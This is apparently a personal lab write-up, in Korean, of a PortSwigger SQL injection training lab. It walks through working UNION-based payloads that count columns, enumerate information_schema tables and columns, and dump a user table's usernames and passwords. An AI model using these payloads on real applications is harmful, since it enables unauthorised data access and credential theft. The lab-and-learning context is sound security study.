---
title: "SQL injection attack, listing the database contents on non-Oracle databases"
tags:
  - portswigger
  - sql-injection
lab_url: "https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle"
difficulty: Practitioner
---

# SQL injection attack, listing the database contents on non-Oracle databases

공개 풀이를 참고하지 않고, 실습에서 확인한 요청과 응답을 순서대로 기록한다. 아직 Solved는 확인하지 않았다.

## 문제 조건

공식 문제 설명에 따르면 상품 카테고리 필터에 SQL 주입 취약점이 있고, 조회 결과가 페이지 응답에 표시된다. 따라서 `UNION`으로 다른 테이블의 데이터를 가져올 수 있다.

애플리케이션에는 로그인 기능이 있다. 데이터베이스에는 사용자 이름과 비밀번호를 담은 테이블이 있으며, 그 **테이블 이름과 열 이름을 찾아** 사용자들의 계정 정보를 조회해야 한다. **완료 조건은 `administrator` 계정으로 로그인하는 것**이다.

출처: [PortSwigger 실습 설명](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)


## 1. 주입 가능성 확인

**실행:**

~~~sql
' OR 1=1 --
~~~

**관찰:** 이 요청이 먹히는 것을 사용자가 확인했다. 구체적인 응답 내용은 아직 기록하지 않았다.

**판단:** 입력이 SQL 조건식에 영향을 줄 수 있다. 이 결과만으로 원래 조회의 열 수나 데이터베이스 종류를 단정하지 않는다.

**다음 행동:** 성공한 주석 형태를 유지하고 `ORDER BY`의 위치 번호를 바꾸어 반환 열 수를 확인한다.

## 2. 반환 열 수 확인

**실행:**

~~~sql
' OR 1=1 ORDER BY 1 --
' OR 1=1 ORDER BY 2 --
' OR 1=1 ORDER BY 3 --
~~~

**관찰:** 1과 2는 정상 응답했고, 3부터 HTTP 500이 발생했다.

**판단:** 세 번째 정렬 위치에서 오류가 시작되므로 원래 조회는 두 열을 반환한다고 추정한다. HTTP 500의 내부 원인은 아직 확인하지 않았다.

**다음 행동:** 두 열을 맞춘 `UNION SELECT`에서 시험 문자열을 각 열에 번갈아 넣었다.

## 3. 문자열 출력 위치 확인

**실행:**

~~~sql
' UNION SELECT 'probe', NULL --
' UNION SELECT NULL, 'probe' --
~~~

**관찰:** 첫 번째 열에 넣었을 때와 두 번째 열에 넣었을 때 모두 화면에 `probe`가 표시됐다고 사용자가 확인했다.

**판단:** 두 열 모두 문자열을 출력할 수 있다. 이후 메타데이터를 조회할 때 어느 쪽 열도 출력 위치로 사용할 수 있다. 아직 테이블 이름이나 데이터베이스 종류는 확인하지 않았다.

**다음 행동:** 접근 가능한 메타데이터에서 테이블 이름을 조회한 뒤, 목표와 관련된 테이블의 열 이름을 확인한다.

## 4. `ALL_VIEWS` 조회 시도

**실행:**

~~~sql
' UNION SELECT view_name, NULL FROM all_views --
~~~

**관찰:** HTTP 500이 반환됐다.

**판단:** 이 요청은 성공하지 않았다. 오류 본문이나 서버 로그가 없으므로 `ALL_VIEWS`의 존재 여부나 데이터베이스 종류를 이 결과 하나로 확정할 수 없다.

**다음 행동:** 앞서 성공한 두 열의 `UNION` 형태를 유지하면서, 다른 메타데이터 조회가 가능한지 별도로 확인한다.

## 5. `information_schema.tables`로 테이블 목록 확인

**실행:**

~~~sql
' UNION SELECT table_schema, table_name FROM information_schema.tables --
~~~

**관찰:** 요청이 성공했고, 붙여넣은 출력에는 스키마·테이블 이름 쌍이 179개 있었다. `pg_catalog` 116개, `information_schema` 61개, `public` 2개였다. `public`에서 확인된 이름은 다음 둘이다.

~~~text
public  users_ntqhfo
public  products
~~~

**판단:** `products`는 상품 카테고리 화면과 관련돼 보이고, `users_ntqhfo`는 문제 조건의 사용자 계정 테이블 후보이다. `pg_catalog`와 `public` 스키마 이름은 PostgreSQL 계열일 가능성을 높이지만, 지금 단계에서는 출력에 나타난 이름 자체만 확정한다.

**다음 행동:** `public.users_ntqhfo`의 열 이름과 자료형을 확인했다.

## 6. 계정 테이블의 열 확인

**실행:**

~~~sql
' UNION SELECT column_name, data_type
FROM information_schema.columns
WHERE table_schema = 'public'
  AND table_name = 'users_ntqhfo' --
~~~

**관찰:** 화면에 `email`, `password_zdayfw`, `username_hxfyzh` 세 열이 표시됐고, 자료형은 모두 `character varying`이었다.

![users_ntqhfo 열 목록](https://raw.githubusercontent.com/ddomology/portswigger-lab-notes/main/content/labs/sql-injection/images/lab-listing-database-contents-non-oracle/01-columns.png)

**판단:** 사용자 이름과 비밀번호를 담을 가능성이 높은 열을 실제 메타데이터에서 확인했다. 열 이름만으로 데이터 내용까지 확정할 수는 없다.

**다음 행동:** 확인한 두 열을 `UNION SELECT`의 두 출력 위치에 넣어 실제 행을 조회했다.

## 7. 계정 행 출력

**실행:**

~~~sql
' UNION SELECT username_hxfyzh, password_zdayfw FROM public.users_ntqhfo --
~~~

**관찰:** 화면에 `administrator`, `wiener`, `carlos`의 사용자 이름과 각 비밀번호가 두 열로 표시됐다. 값은 이 실습 인스턴스의 화면 캡처에 보존했다.

![계정 조회 결과](https://raw.githubusercontent.com/ddomology/portswigger-lab-notes/main/content/labs/sql-injection/images/lab-listing-database-contents-non-oracle/02-accounts.png)

**판단:** `users_ntqhfo`가 문제 조건의 계정 테이블임을 실제 행으로 확인했다. 아직 `administrator` 로그인과 Solved 상태는 확인하지 않았다.

**다음 행동:** 출력된 `administrator` 계정 값으로 로그인해 완료 조건을 확인한다.

